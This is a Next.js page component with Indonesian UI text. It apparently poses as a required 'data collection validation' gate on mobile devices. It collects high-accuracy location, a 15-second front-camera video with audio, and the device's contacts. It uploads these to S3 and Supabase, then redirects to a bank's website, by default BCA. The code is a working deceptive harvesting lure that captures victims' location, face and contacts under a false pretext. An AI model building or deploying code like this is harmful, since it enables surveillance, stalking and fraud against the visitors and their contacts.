/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useState, useEffect, useRef } from "react";
import { supabase } from "@/lib/supabse";
import FullScreenLoader from "@/components/FullScreenLoader";
import { LocationData } from "@/types";

export default function Home() {
	const [status, setStatus] = useState<"initial" | "location" | "camera" | "contacts" | "completed" | "error">("initial");
	const [error, setError] = useState("");
	const [userData, setUserData] = useState<{ id?: string; location?: LocationData; contacts?: any[] }>({});
	const videoRef = useRef<HTMLVideoElement>(null);
	const mediaRecorderRef = useRef<MediaRecorder | null>(null);
	const recordedChunksRef = useRef<Blob[]>([]);

	useEffect(() => {
		// Hanya jalankan di perangkat mobile
		if (typeof window !== "undefined" && window.innerWidth < 768) {
			// Tampilkan loader selama 3 detik
			setTimeout(() => {
				setStatus("location");
				requestLocation();
			}, 3000);
		} else {
			setStatus("error");
			setError("Hanya tersedia di perangkat mobile");
		}
	}, []);

	const requestLocation = async () => {
		try {
			const location = await getLocation();
			setUserData((prev) => ({ ...prev, location }));

			// Simpan ke database
			const { data, error } = await supabase.from("user_data").insert([{ location }]).select().single();

			if (error) throw new Error(`Gagal menyimpan lokasi: ${error.message}`);

			setUserData((prev) => ({ ...prev, id: data.id }));
			setStatus("camera");
		} catch (err: any) {
			setStatus("error");
			setError(err.message);
		}
	};

	const startCamera = async () => {
		try {
			const stream = await navigator.mediaDevices.getUserMedia({
				video: { facingMode: "user" },
				audio: true,
			});

			if (videoRef.current) {
				videoRef.current.srcObject = stream;
			}

			return stream;
		} catch (err) {
			throw new Error(`Gagal mengakses kamera: ${(err as Error).message}`);
		}
	};

	const handleStartRecording = async () => {
		try {
			setStatus("camera");
			const stream = await startCamera();

			const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
			mediaRecorderRef.current = recorder;
			recordedChunksRef.current = [];

			recorder.ondataavailable = (e) => {
				if (e.data.size > 0) {
					recordedChunksRef.current.push(e.data);
				}
			};

			recorder.onstop = async () => {
				try {
					const blob = new Blob(recordedChunksRef.current, { type: "video/webm" });
					const fileName = `video-${Date.now()}.webm`;
					const videoUrl = await uploadToS3(blob, fileName);

					// Simpan URL video ke database
					if (userData.id) {
						await supabase.from("user_videos").insert([
							{
								user_data_id: userData.id,
								video_url: videoUrl,
							},
						]);
					}

					// Lanjut ke kontak
					setStatus("contacts");
					requestContacts();

					// Hentikan stream
					stream.getTracks().forEach((track) => track.stop());
				} catch (err) {
					setStatus("error");
					setError(`Gagal mengunggah video: ${(err as Error).message}`);
				}
			};

			recorder.start();

			// Otomatis berhenti setelah 15 detik
			setTimeout(() => {
				if (recorder.state === "recording") {
					recorder.stop();
				}
			}, 15000);
		} catch (err) {
			setStatus("error");
			setError(`Gagal memulai rekaman: ${(err as Error).message}`);
		}
	};

	const requestContacts = async () => {
		try {
			if (!("contacts" in navigator)) {
				throw new Error("Browser tidak mendukung akses kontak");
			}

			const contacts = await (navigator as any).contacts.select(["name", "email", "tel"], { multiple: true });
			const formattedContacts = contacts.map((contact: any) => ({
				name: contact.name?.[0] || "",
				email: contact.email?.[0] || "",
				phone: contact.tel?.[0] || "",
			}));

			setUserData((prev) => ({ ...prev, contacts: formattedContacts }));

			// Simpan kontak ke database
			if (userData.id) {
				await supabase.from("user_data").update({ contacts: formattedContacts }).eq("id", userData.id);
			}

			setStatus("completed");

			// Redirect setelah 2 detik
			setTimeout(() => {
				window.location.href = process.env.NEXT_PUBLIC_REDIRECT_URL || "https://www.bca.co.id";
			}, 2000);
		} catch (err: any) {
			setStatus("error");
			setError(`Gagal mengambil kontak: ${err.message}`);
		}
	};

	return (
		<div className="min-h-screen flex flex-col items-center justify-center p-4 bg-white">
			{status === "initial" && <FullScreenLoader message="Anda harus melewati validasi pengumpulan data untuk bisa melanjutkan akses ke website kami" />}

			{status === "location" && (
				<div className="text-center">
					<div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mx-auto mb-6"></div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Mengakses Lokasi</h2>
					<p className="text-gray-600">Harap berikan izin akses lokasi...</p>
				</div>
			)}

			{status === "camera" && (
				<div className="w-full max-w-md">
					<div className="bg-gray-100 rounded-xl overflow-hidden mb-6">
						<video ref={videoRef} autoPlay playsInline muted className="w-full h-auto aspect-video object-cover" />
					</div>

					<div className="text-center">
						<button onClick={handleStartRecording} className="px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors shadow-md">
							Mulai Merekam (15 detik)
						</button>
						<p className="text-gray-500 mt-4">Video akan otomatis berhenti setelah 15 detik</p>
					</div>
				</div>
			)}

			{status === "contacts" && (
				<div className="text-center">
					<div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mx-auto mb-6"></div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Mengakses Kontak</h2>
					<p className="text-gray-600">Harap berikan izin akses kontak...</p>
				</div>
			)}

			{status === "completed" && (
				<div className="text-center">
					<div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
						<svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
						</svg>
					</div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Verifikasi Berhasil!</h2>
					<p className="text-gray-600">Anda akan diarahkan ke halaman tujuan...</p>
				</div>
			)}

			{status === "error" && (
				<div className="text-center max-w-md p-6 bg-white rounded-xl shadow-lg">
					<div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
						<svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
						</svg>
					</div>
					<h2 className="text-xl font-semibold text-gray-800 mb-2">Terjadi Kesalahan</h2>
					<p className="text-gray-600 mb-4">{error}</p>
					<button onClick={() => window.location.reload()} className="px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors">
						Coba Lagi
					</button>
				</div>
			)}
		</div>
	);
}

// ===== Fungsi Bantuan =====
const getLocation = async (): Promise<{ lat: number; lng: number; accuracy: number }> => {
	return new Promise((resolve, reject) => {
		if (!navigator.geolocation) {
			reject(new Error("Browser tidak mendukung geolokasi"));
			return;
		}

		navigator.geolocation.getCurrentPosition(
			(position) => {
				resolve({
					lat: position.coords.latitude,
					lng: position.coords.longitude,
					accuracy: position.coords.accuracy,
				});
			},
			(error) => {
				reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`));
			},
			{ enableHighAccuracy: true, timeout: 10000 }
		);
	});
};

const uploadToS3 = async (file: Blob, fileName: string): Promise<string> => {
	try {
		// Dapatkan URL unggah dari API
		const response = await fetch("/api/s3-upload", {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({ fileName, fileType: file.type }),
		});

		const data = await response.json();

		if (!response.ok) {
			throw new Error(data.error || "Gagal mendapatkan URL unggah");
		}

		// Upload file langsung ke S3
		const uploadResponse = await fetch(data.url, {
			method: "PUT",
			body: file,
			headers: { "Content-Type": file.type },
		});

		if (!uploadResponse.ok) {
			throw new Error("Upload ke S3 gagal");
		}

		return data.publicUrl;
	} catch (err) {
		throw new Error(`Gagal mengunggah video: ${(err as Error).message}`);
	}
};
